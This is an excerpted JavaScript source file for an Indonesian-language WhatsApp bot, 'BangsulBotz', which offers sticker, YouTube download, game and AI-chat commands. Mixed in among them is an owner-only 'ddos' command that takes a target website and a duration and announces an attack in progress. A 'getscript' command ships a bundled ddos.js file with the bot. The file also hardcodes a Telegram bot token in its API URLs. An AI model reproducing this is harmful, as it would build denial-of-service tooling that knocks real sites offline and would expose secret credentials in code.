...
const { tiktokDl,instagramDl, instaStory, ytMp4, ytMp3, allDl, quotedLyo, Ytdl, simi, mediafireDl } = require('./lib/screaper');
const { rdGame, iGame, setLimit } = require('./lib/game');
const { wallpaper, ringtone, styletext, multiDownload } = require('./lib/screaper');
...
const profile = fs.readFileSync('./data/bangsul.jpg');
// Read Database
...
let incomingMessage = m.text.toLowerCase(); // mengambil pesan masuk dan mengubahnya ke huruf kecil
...
async function getTelegramStickers(link) {
    let response = await fetch(`https://api.telegram.org/bot7448569365:AAGJNaw413Xj8KCuPzH1WJPg2yUBgGZHz4o/getStickerSet?name=${link.split('addstickers/')[1]}`);
...
async function downloadSticker(file_id) {
    ...
    let response = await fetch(`https://api.telegram.org/bot7448569365:AAGJNaw413Xj8KCuPzH1WJPg2yUBgGZHz4o/getFile?file_id=${file_id}`);
    let data = await response.json();

    if (!data.ok) throw new Error('Gagal mendapatkan file dari Telegram');

    // URL untuk mendownload file
    let fileUrl = `https://api.telegram.org/file/bot7448569365:AAGJNaw413Xj8KCuPzH1WJPg2yUBgGZHz4o/${data.result.file_path}`;
...
const aimenu = 7;
const searchmenu = 9;
const downloadmenu = 6;
const quotesmenu = 9;
const funmenu = 26;
const gamemenu = 11;

// Total fitur otomatis
const totalfitur = + caseadd + listrespon + ownermenu + listsewa + grupmenu + botmenu + toolsmenu + aimenu + searchmenu + downloadmenu + quotesmenu + funmenu + gamemenu ;
...
switch(command) {
	...
	case 'getsc': case 'getscript': {
		...
		try {
			...
			archive.file('./ddos.js', { name: 'ddos.js' });
	...
	case 'ddos': {
		if (!isCreator) return m.reply(mess.owner)
		if (!text.includes(' ')) return m.reply(`Gunakan format yang benar: .${command} <target> <waktu>\nContoh: .${command} example.my.id 60`)
		
		const targetweb = text.substring(0, text.indexOf(' '))
		const timeweb = text.substring(text.lastIndexOf(' ') + 1)
		
		let moci = `*Serangan sedang berlangsung... harap tunggu hasilnya! 😤*
	• Target ->  ${targetweb}
	• Durasi Serangan -> ${timeweb} detik`
	
		// Mengirim pesan dengan tombol manual
		const buttons = [
			{ buttonId: 'cek_web', buttonText: { displayText: 'Cek Website' }, type: 1 }
		]
		const buttonMessage = {
			text: moci,
			footer: '',
		...
		// Menjalankan perintah untuk ddos
...
╚» ${runtime(process.uptime())}`;
	...
	break
	case 'runtime': case 'tes': case 'rt' : {
		// Tambahkan pengaturan baru untuk Anti Toxic
		const settings = {
			anticall: 'Anti Call',
			autobio: 'Auto Bio',
			autoread: 'Auto Read',
		...
		if (text && text.startsWith('--') && isCreator) {
			const buttonOptions = Object.keys(settings).map(key => [
				{ title: `${settings[key]} On🟢`, description: `Mengaktifkan ${settings[key]}`, id: `.bot ${key} on` },
				{ title: `${settings[key]} Off🔴`, description: `Mematikan ${settings[key]}`, id: `.bot ${key} off` }
			]).flat();
			...
			const settingKey = action[0];
			const settingValue = action[1];
	
			if (settings[settingKey]) {
				db.set[botNumber][settingKey] = settingValue === 'on';
				m.reply(`Sukses ${settingValue === 'on' ? 'Mengaktifkan' : 'Mematikan'} ${settings[settingKey]}`);
			}
	
			if (text === 'settings') {
				const settingsBot = Object.entries(db.set[botNumber])
					.map(([key, value]) => `${settings[key]} : ${value ? 'On🟢' : 'Off🔴'}`)
					.join('\n');
				m.reply(settingsBot);
			}
		} else {
			naze.sendMessage(m.chat, { text: `*BangsulBotz 🤖 Aktif Selama:*\n\n ⏳ *Durasi Aktif:*\n       *${runtime(process.uptime())}*\n\n🧑‍ *Pengguna*         : ${Object.keys(global.db.users).length}` }, { quoted: m });
		}
	}
	break;
	...
	case 'database':case 'db': case 'totaluser':case 'totalpengguna':{
		m.reply(` *Pengguna*  : ${Object.keys(global.db.users).length} user`) 
	}
	break	
...
textw += `🏳️ *Negara*           : ${negara}\n`;
	...
	break;
	case 'stele': {
		if (!args[0]) return m.reply('Harap masukkan link package stiker Telegram!');
	
		let link = args[0];
		await m.reply('Stiker akan dikirim...');
		if (!link.includes('t.me/addstickers/')) return m.reply('Link yang Anda masukkan bukan link stiker Telegram yang valid!');
	
		try {
			let stickerData = await getTelegramStickers(link);
	
			// Filter stiker yang bukan video
			let nonVideoStickers = stickerData.filter(sticker => !sticker.is_video);
			
			if (nonVideoStickers.length === 0) {
				return m.reply('Bot tidak bisa mengirim stiker video, hanya bisa mengirim stiker foto.');
			}
	
			for (let i = 0; i < nonVideoStickers.length; i++) {
				let file_id = nonVideoStickers[i].file_id;
	
				// Download dan konversi stiker dari Telegram ke format WA
				let stickerBuffer = await downloadSticker(file_id);
	
				// Kirim stiker ke grup/privat
				await naze.sendMessage(m.chat, { sticker: stickerBuffer });
			}
	
			m.reply('Semua stiker telah berhasil dikirim!');
		} catch (e) {
			console.error(e);
			m.reply('Terjadi kesalahan saat mengambil atau mengirim stiker.');
		}
	}
	break;
...
// searchmenu = 9
	...
	case 'play': case 'ytplay': case 'yts': case 'ytsearch': {
		...
		try {
			...
			await naze.sendMessage(m.chat, { image: { url: video.thumbnail }, caption: teksnya }, { quoted: m });

			// Mengunduh Audio menggunakan API
			try {
				const audioRes = await fetchJson(`https://api.siputzx.my.id/api/d/ytmp3?url=${video.url}`);
				if (!audioRes.status) throw new Error("Gagal mendapatkan audio.");
				
				await naze.sendMessage(m.chat, {
					audio: { url: audioRes.data.dl },
					mimetype: 'audio/mpeg',
			...
			try {
				const videoRes = await fetchJson(`https://api.siputzx.my.id/api/d/ytmp4?url=${video.url}`);
				if (!videoRes.status) throw new Error("Gagal mendapatkan video.");
				
				await naze.sendMessage(m.chat, {
					video: { url: videoRes.data.dl }
				}, { quoted: m });
			} catch (e) {
...
// downloadmenu = 6
    ...
    case 'ytmp3': case 'youtubemp3': {
        ...
        try {
            let apiUrl = `https://api.siputzx.my.id/api/d/ytmp3?url=${encodeURIComponent(text)}`;
            let response = await fetch(apiUrl);
            let result = await response.json();

            if (!result.status || !result.data || !result.data.dl) {
                return m.reply("Gagal mendapatkan tautan unduhan. Coba lagi nanti.");
            }

            let audioDoc = {
                audio: { url: result.data.dl },
                mimetype: 'audio/mp4',
    ...
    case 'ytmp4': case 'youtubemp4': {
        ...
        try {
            let apiUrl = `https://api.siputzx.my.id/api/d/ytmp4?url=${encodeURIComponent(text)}`;
            let response = await fetch(apiUrl);
            let result = await response.json();
...
${barisjudul} *AI MENU* 
${tutupjudul}
${barisfitur} ${prefix}ai  (teks) 
${barisfitur} ${prefix}autoai  (on/off) 
${barisfitur} ${prefix}gpt (teks) 
${barisfitur} ${prefix}gpt4 (teks) 
${barisfitur} ${prefix}openai (teks) 
${barisfitur} ${prefix}simi (teks) 
...
${barisfitur} ${prefix}ddos 
${barisfitur} ${prefix}delcase (nama grup) 
...
${barisfitur} ${prefix}stele (url sticker telegram) 
...
// Hanya menambahkan satu watcher
